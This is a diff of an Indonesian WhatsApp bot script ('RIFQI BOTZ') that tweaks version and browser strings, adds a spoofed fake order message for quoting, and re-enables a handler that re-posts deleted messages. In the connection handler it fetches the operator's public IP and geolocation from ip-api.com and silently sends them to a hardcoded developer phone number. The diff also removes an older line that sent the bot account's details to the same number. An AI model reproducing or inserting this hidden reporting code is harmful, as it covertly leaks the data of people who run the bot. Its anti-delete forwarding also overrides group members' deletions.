@@ -53,7 +53,7 @@ const setting = JSON.parse(fs.readFileSync('./setting.json'))
 
 const welcome = require('./message/group')
 
-
+const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: fs.readFileSync(`media/odc.jpeg`), surface: 200, message: `ʀɪғǫɪ ʙᴏᴛᴢ`, orderTitle: `RIFQIBOTZ`, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
 
 baterai = 'unknown'
 
@@ -133,7 +133,7 @@ const starts = async (ikyy = new WAConnection()) => {
 
 	ikyy.logger.level = 'warn'
 
-ikyy.version = [2, 2140, 12];
+ikyy.version = [2, 2147, 14];
 
 	console.log(color(figlet.textSync('YT RIFQI BOTZ', {
 
@@ -222,33 +222,48 @@ console.log(color(`${spc4}< ================================================== >
 
 console.log(color('[ LORD RIFQI BOTZ ]', 'cyan'), color('Bot Sudah Online!'));
 
-ikyy.browserDescription = ["RIFQI - BOTZ", "Firefox", "3.0.0"];
+ikyy.browserDescription = ["RIFQI - BOTZ", "Safari", "3.0.0"];
 
 
 	})
 
+//join ke gc
 
-/**join ke gc
-
-teks = `https://chat.whatsapp.com/Hnb8UOsuN4t5hSEMNTUdft`
+/**teks = `https://chat.whatsapp.com/JtXKjv1uGhKJyrpERmN6AZ`
  ikyy.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|INFO!|', 'yellow'), color('JOINED TO FORUM WHATSAPP BOT GROUP', 'cyan'))**/
 
 
 // send message 
-ikyy.sendMessage(`6289636634511@s.whatsapp.net`, `*Bot On Mek, Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(ikyy.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Owner RIFQI BOTZ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./connect.jpg'),sourceUrl:"https://wa.me/6289636634511?text=Assalamualaikum"}}})
-
-console.log(color('|INFO!|', 'yellow'), color('mengirim info bot ke owner', 'cyan'))
-
 fetch(`http://ip-api.com/line`).then(res => res.text())  
 
         .then(bu =>{
 
-       ikyy.sendMessage("6289636634511@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Owner RIFQI BOTZ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./connect.jpg'),sourceUrl:"https://wa.me/6289636634511?text=Assalamualaikum"}}})
+console.log(color('|INFO!|', 'yellow'), color('mengirim info bot ke owner', 'cyan'))
 
-     console.log(color('|INFO!|', 'yellow'), color('mengirim info bot ke owner', 'cyan'))
+             buttonss = [
+{buttonId: `#ping`, buttonText:{displayText: 'ᴘɪɴɢ'}, type: 1}
+]
 
+buttonMessagee = {
+contentText: `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`,
+footerText: `ʀɪғǫɪ ʙᴏᴛᴢ` ,
+buttons: buttonss,
+headerType: 1
+}
+ikyy.sendMessage(`6289636634511@s.whatsapp.net`,  buttonMessagee, MessageType.buttonsMessage,{
+        caption: '[ • XMOODS • ]',
+        "contextInfo": {
+            text: 'hi',
+            "forwardingScore": 1000000000,
+            isForwarded: true,
+            sendEphemeral: true,
+         
+            },
+			quoted: ftroli,sendEphemeral: true 
+			})
    })
+   
 	// session
 
 
@@ -392,7 +407,7 @@ ikyy.on('CB:action,,call', async json => {
 
 
 
-/**antidel = true
+antidel = false
 ikyy.on('message-delete', async (m) => {
 if (m.key.remoteJid == 'status@broadcast') return
 if (!m.key.fromMe && m.key.fromMe) return
@@ -418,7 +433,7 @@ ikyy.sendMessage(m.key.remoteJid, `\`\`\` A N T I  D E L E T E \`\`\`
 ˊ Type : ${type}`, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
 
 ikyy.copyNForward(m.key.remoteJid, m.message)
-})**/
+})
 
 
   
